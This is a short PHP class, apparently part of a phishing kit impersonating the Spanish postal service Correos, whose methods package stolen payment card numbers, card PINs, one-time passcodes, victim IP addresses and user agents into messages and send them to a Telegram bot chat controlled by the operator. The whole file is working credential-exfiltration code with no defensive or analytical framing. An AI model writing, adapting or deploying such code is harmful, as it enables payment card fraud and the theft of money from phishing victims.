<?php
class SendTg {
    protected $bot_token;
    protected $chat_id;

    function __construct($bot_token, $chat_id)
    {
        $this->bot_token = $bot_token;
        $this->chat_id = $chat_id;
    }

    public function send($msg) {
        $apiToken = $this->bot_token;
        $data = [
            'chat_id' => $this->chat_id,
            'text' => $msg
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
    }

    public function sendCard($cc, $ip, $uag) {
        $msg  = "CORREOS CC\n";
        $msg .= "\nCC : ".$cc;
        $msg .= "\nIP : ".$ip;
        $msg .= "\n\nUAG : ".$uag;
        $this->send($msg);
    }

    public function sendPin($cc, $pin, $ip, $uag) {
        $msg  = "CORREOS CC + PIN\n";
        $msg .= "\nCC : ".$cc;
        $msg .= "\nPIN : ".$pin;
        $msg .= "\nIP : ".$ip;
        $msg .= "\n\nUAG : ".$uag;
        $this->send($msg);
    }

    public function sendOtp($cc, $otp) {
        $msg  = "CORREOS OTP {$cc}\n";
        $msg .= "\nOTP : ".$otp;
        $this->send($msg);
    }
}